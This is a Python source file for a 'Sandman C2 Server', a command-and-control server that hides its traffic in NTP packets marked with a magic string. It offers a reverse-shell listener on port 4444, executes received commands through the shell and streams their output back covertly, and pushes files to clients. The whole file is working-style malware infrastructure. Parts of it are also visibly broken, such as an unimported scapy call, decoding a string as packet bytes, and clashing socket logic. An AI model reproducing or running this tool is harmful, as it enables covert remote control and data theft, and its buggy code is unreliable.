#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sandman C2 Server
Features:
  - NTP Heartbeat (0x1B + IDOV31)
  - Hardcoded Logic:
    1. Reverse Shell (TCP Port 4444)
    2. File Search (Multi-Threading Background Execution)
    3. File Upload (GUI Dialog Selection)
  - Multi-Client Support
  - Spoofing Support
"""

import sys
import os
import time
import struct
import socket
import threading
import subprocess
import queue
from tkinter import Tk, filedialog
from scapy.all import sniff, IP, UDP, NTP

# === CONFIGURATION ===
INTERFACE = "eth0"
SERVER_HOST = "192.168.230.1"  # Client expects to connect to this IP
SERVER_IP = "192.168.230.1"    # Server actually responds from this IP (or spoofed)
NTP_PORT = 123
SLEEP = 0.1
CHUNK_SIZE = 48
MALICIOUS_MAGIC = b"IDOV31"
MAGIC_BYTE = 0x1B

# === HARDWARE SOCKETS (Global) ===
tcp_shell_sock = None       # Reverse Shell Socket (Port 4444)
tcp_upload_sock = None      # Upload Socket (Port 8888)

# === THREAD POOL FOR SEARCH ===
search_queue = queue.Queue()
def process_search_queue():
    while True:
        try:
            cmd, src_ip, dst_ip, ntp_port = search_queue.get()
            execute_search(cmd, src_ip, dst_ip, ntp_port)
        except Exception as e:
            print(f"[-] Search Thread Error: {e}")
        search_queue.task_done()

def start_search_threads():
    thread = threading.Thread(target=process_search_queue, daemon=True)
    thread.start()

# === PACKET HANDLING ===
def pack_ntp_resp(type_byte, data):
    header = struct.pack('B', type_byte) + MALICIOUS_MAGIC
    header += data[:48]
    return header[:48]

def send_udp_packet(data, src, dst, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (dst, port))
        return True
    except Exception as e:
        print(f"[-] Send Error: {e}")
        return False

# === 1. HARDCODED REVERSE SHELL (TCP 4444) ===
def spawn_reverse_shell(ip_source, ip_dest):
    """Spawn a PowerShell Reverse Shell Listener (Hardcoded TCP Listener)"""
    global tcp_shell_sock
    try:
        print(f"[+] Spawning Reverse Shell Listener on {SERVER_HOST}:4444...")
        
        # 1. Create TCP Socket
        tcp_shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_shell_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_shell_sock.bind((SERVER_HOST, 4444))
        tcp_shell_sock.listen(5)
        print(f"[+] TCP Listener Ready: {SERVER_HOST}:4444")
        
        # 2. Accept Connection from Client
        conn, addr = tcp_shell_sock.accept()
        print(f"[+] Client Connected: {addr}")
        
        # 3. Send Acknowledgement via NTP
        ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
        send_udp_packet(ack, ip_source, ip_dest, NTP_PORT)
        
        # 4. Keep Connection Alive
        while True:
            time.sleep(SLEEP)
        
    except Exception as e:
        print(f"[-] Reverse Shell Error: {e}")
        return False
    return True

# === 2. HARDCODED FILE SEARCH (Multi-Threading Background Execution) ===
def execute_search(cmd, src_ip, dst_ip, ntp_port):
    """Execute search command (e.g., 'dir C:\\Temp\\*') in a background thread"""
    try:
        print(f"[+] Executing Search: {cmd}")
        
        # Parse Command (Example: 'dir C:\\Temp\\*')
        if cmd and cmd.strip() != "CMD":
            # Run in background thread
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = p.communicate()
            
            if stdout:
                print(f"[+] File Search Result: {len(stdout)} bytes")
                # Stream chunks back via NTP
                for i in range(0, len(stdout), CHUNK_SIZE):
                    chunk = stdout[i:i+CHUNK_SIZE]
                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                    send_udp_packet(packet, src_ip, dst_ip, ntp_port)
                    time.sleep(SLEEP)
            
            # End-of-Transmission
            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
            send_udp_packet(packet, src_ip, dst_ip, ntp_port)
        
    except Exception as e:
        print(f"[-] Search Error: {e}")

# === 3. HARDCODED FILE UPLOAD (GUI Dialog Selection) ===
def run_file_upload(ip_source, ip_dest, ntp_port=123):
    """Open a TCP Listener for File Upload with GUI Dialog"""
    global tcp_upload_sock
    try:
        # 1. Create TCP Listener
        tcp_upload_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_upload_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_upload_sock.bind(("0.0.0.0", 8888))
        tcp_upload_sock.listen(5)
        print(f"[+] Opening TCP Upload Listener on Port 8888...")
        
        # 2. Send ACK to Client
        ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
        send_udp_packet(ack, ip_source, ip_dest, ntp_port)
        
        # 3. Accept File Upload
        conn, addr = tcp_upload_sock.accept()
        print(f"[+] Received Upload Request from {addr}")
        
        # 4. Open GUI Dialog to Select File
        root = Tk()
        root.withdraw()  # Hide window (only show dialog)
        file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
        root.destroy()
        
        if file_path:
            print(f"[+] Selected File: {file_path}")
            
            # 5. Stream File to Client
            buffer = b""
            with open(file_path, "rb") as f:
                buffer = f.read()
            
            # 6. Send in Chunks
            for i in range(0, len(buffer), CHUNK_SIZE):
                chunk = buffer[i:i+CHUNK_SIZE]
                packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
                time.sleep(SLEEP)
            
            print(f"[+] Upload Complete: {len(buffer)} bytes")
            
            # 7. End-of-Transmission
            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
        
        else:
            print("[-] No File Selected")
            packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
        
        # 8. Keep Listening
        while True:
            conn, addr = tcp_upload_sock.accept()
            print(f"[+] Received Upload Request from {addr}")
            root = Tk()
            root.withdraw()
            file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
            root.destroy()
            if file_path:
                buffer = b""
                with open(file_path, "rb") as f:
                    buffer = f.read()
                
                for i in range(0, len(buffer), CHUNK_SIZE):
                    chunk = buffer[i:i+CHUNK_SIZE]
                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                    send_udp_packet(packet, ip_source, ip_dest, ntp_port)
                    time.sleep(SLEEP)
                
                print(f"[+] Upload Complete: {len(buffer)} bytes")
                
                packet = pack_ntp_resp(MAGIC_BYTE, b"END")
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
            else:
                packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
        
    except Exception as e:
        print(f"[-] File Upload Error: {e}")

# === HEARTBEAT HANDLER ===
def handle_heartbeat(ip_source, ip_dest, raw_data, src_port, dst_port, type_byte, src_type):
    """Process the heartbeat and trigger the appropriate handler"""
    try:
        # 1. Check Magic & Signature
        raw_bytes = raw_data[:48]
        if len(raw_bytes) < 7:
            return
        
        if raw_bytes[1:7] == MALICIOUS_MAGIC:
            # 2. Extract Payload Type (Next 6 bytes: Type)
            type_data = raw_bytes[7:13]
            type_str = type_data.decode().strip()
            print(f"[+] Received Type: {type_str}")
            
            # 3. Determine Action
            if type_str == "ReverseShell":
                print("[+] Handling ReverseShell...")
                spawn_reverse_shell(ip_source, ip_dest)
                ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
                
            elif type_str == "FileSearch":
                print("[+] Handling FileSearch...")
                # Receive Command String from Client
                cmd = ip_source
                cmd = cmd[:48]
                cmd = cmd.decode().strip()
                
                # Queue the search command
                if cmd:
                    search_queue.put((cmd, ip_source, ip_dest, NTP_PORT))
                    ack = pack_ntp_resp(MAGIC_BYTE, b"QUEUED")
                else:
                    ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
                
                send_udp_packet(ack, ip_source, ip_dest, src_port)
                
            elif type_str == "FileUpload":
                print("[+] Handling FileUpload...")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(("0.0.0.0", 8888))
                sock.listen(5)
                print(f"[+] Server Listening: 0.0.0.0:8888")
                ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
                
            else:
                print(f"[-] Unknown Type: {type_str}")
                ack = pack_ntp_resp(MAGIC_BYTE, b"UNKNOWN")
                send_udp_packet(ack, ip_source, ip_dest, src_port)
        
        else:
            print(f"[-] No Magic Signature")
            ack = pack_ntp_resp(MAGIC_BYTE, b"NO_MAGIC")
            send_udp_packet(ack, ip_source, ip_dest, src_port)
    
    except Exception as e:
        print(f"[-] Handle Error: {e}")
    finally:
        time.sleep(SLEEP)

# === MAIN LOOP ===
def sniff_loop(interface, filter_str, timeout=5):
    print(f"[+] Starting NTP Sniffer on {interface}...")
    print(f"[+] Filter: {filter_str}")
    
    start_search_threads()  # Start background thread pool
    
    while True:
        try:
            packet = sniff(iface=interface, filter=filter_str, count=1, timeout=timeout, verbose=0)
            if packet:
                ntp_pkt = packet[0][NTP]
                ip_pkt = packet[0][IP]
                
                # 1. Check NTP Magic Byte
                raw = scapy.raw(ntp_pkt)
                if raw[1:7] == MALICIOUS_MAGIC:
                    # 2. Receive Magic + Type
                    connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    connection.bind((SERVER_HOST, NTP_PORT))
                    
                    # 3. Receive Payload Type (Next 6 bytes: Type)
                    type_data = connection.recv(6)
                    type_str = type_data.decode().strip()
                    
                    # 4. Determine Payload
                    payload_cfg = {
                        "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
                        "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
                        "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
                    }
                    
                    # 5. Send Payload Size
                    size = 4096
                    size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
                    connection.send(size_chunk)
                    
                    # 6. Send Payload Data (Chunks)
                    content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
                    for i in range(0, len(content), CHUNK_SIZE):
                        chunk = content[i:i+CHUNK_SIZE]
                        chunk_pkt = pack_ntp_resp(MAGIC_BYTE, chunk)
                        connection.send(chunk_pkt)
                        time.sleep(SLEEP)
                    
                    # 7. Send End-of-Transmission
                    connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
        
        except Exception as e:
            print(f"[-] Sniff Error: {e}")
        finally:
            time.sleep(SLEEP)

def print_banner():
    print("""
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
        Sandman C2 Server
     """)

if __name__ == "__main__":
    print_banner()
    
    if len(sys.argv) >= 2:
        INTERFACE = sys.argv[1]
    if len(sys.argv) >= 3:
        NTP_PORT = int(sys.argv[2])
    
    filter_str = f"udp and port {NTP_PORT}"
    print(f"[+] Starting NTP Sniffer on {INTERFACE}...")
    print("[+] Listening for Heartbeats...")
    
    sniff_loop(INTERFACE, filter_str)
